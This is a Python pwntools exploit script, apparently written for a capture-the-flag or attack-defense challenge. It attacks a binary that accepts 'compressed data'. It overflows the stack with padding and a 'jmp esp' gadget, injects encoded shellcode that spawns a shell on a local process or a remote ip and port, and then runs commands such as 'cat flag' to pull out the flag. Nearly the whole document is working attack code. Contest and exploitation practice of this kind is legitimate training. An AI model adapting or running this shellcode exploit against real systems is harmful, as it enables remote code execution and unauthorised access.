#!/usr/bin/env python
from pwn import *

def decode(s):
	ans = list(s)
	prev1 = 0
	prev2 = 0
	prev3 = 0
	for i in range(len(s)):
		prev1 = (prev1 + prev2 + prev3) / 3
		ans[i] = chr((ord(s[i]) - prev1)%256)
		prev1 = prev2
		prev2 = prev3
		prev3 = ord(s[i])
	return ''.join(ans)


def exp(local,binary,msg,ip=0,port=0,timeout=1):
	if local:
		p = process(binary)
	else:
		p = remote(ip,port,timeout=timeout)
	
	try:	
		input = 0xffbdd41c
		ret = 0xffbdd53c
		padding = ret-input
		gadget = 0x080de873	# jmp esp
		p.recvuntil('plz give me the compressed data\nsize: ',timeout=timeout)
		p.send('100'.ljust(8,'\x00'))
		# gdb.attach(p,'b *0x8048a07')
		shellcode ='%'+'%dc'%padding
		shellcode += p32(gadget)
		shellcode += asm(shellcraft.sh())
		shellcode = decode(shellcode.ljust(100,'\x90'))
		# print len(shellcode)
		p.sendline(shellcode)

		p.sendline('echo 123')
		p.recvuntil('123',timeout=timeout)
		p.sendline(msg)
		p.sendline('echo 456')
		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		# p.interactive()
		p.close()
		return flag[:-3]
	except:
		# print 'failed'
		p.close()
		return ''


if __name__ == '__main__':
	print exp(True,'bin2','cat flag')
